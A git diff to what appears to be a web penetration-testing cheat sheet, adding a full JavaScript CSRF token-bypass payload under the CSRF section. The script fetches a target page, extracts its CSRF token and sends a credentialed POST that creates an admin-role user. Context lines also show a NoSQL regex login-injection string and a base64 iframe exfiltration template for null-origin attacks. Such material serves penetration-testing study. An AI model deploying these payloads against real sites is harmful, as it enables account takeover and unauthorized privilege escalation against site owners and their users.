@@ -921,6 +921,8 @@ username=admin&password[$regex]=^a.....
 https://ivangoncharov.github.io/graphql-voyager/
   
 ## CSRF
+
+e.g.  
 -> csrf.html  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf.html
   
@@ -930,9 +932,47 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 -> csrf_json_xhr.html  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_json_xhr.html
   
+### Bypass Token CSRF - Example
 -> csrf_token_bypass.html  
+```
+<script type="text/javascript">
+
+function addUser(token)
+{
+
+	var url="https://site.com/add_user.php";
+	var params="name=Admin&surname=ok&email=ok@gmail.com&role=admin&submit=CSRFToken=" + token;
+
+	var CSRF = new XMLHttpRequest();
+	CSRF.open("POST", url, true);
+	CSRF.withCredentials = 'true';
+	CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+	CSRF.send(params);
+
+}
+
+//Token Extraction
+var XHR = new XMLHttpRequest();
+XHR.onreadystatechange = function(){
+
+	if(XHR.readyState == 4){
+		var htmlSource = XHR.responseText;
+		
+		//Extract the token
+		var parser = new DOMParser().parseFromString(htmlSource, "text/html");
+		var token = parser.getElementById('CSRFToken').value;
+
+		addUser(token);
+	}
+}
+
+XHR.open('GET', 'http://site.com/add_user.php', true);
+XHR.send();
+	
+</script>
+```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_token_bypass.html
-  
 ### Analyze the token and perform brute-force
 
 1-  
@@ -1127,7 +1167,6 @@ xhr.send(null);
 ### Null Origin Exploitation Exfiltrate via url per server + base64
 -> nulloriginb64.html
 ```
-
 <iframe src="data:text/html;base64,<YOUR_BASE64_HERE>"></iframe>
 </head></html>
 ```
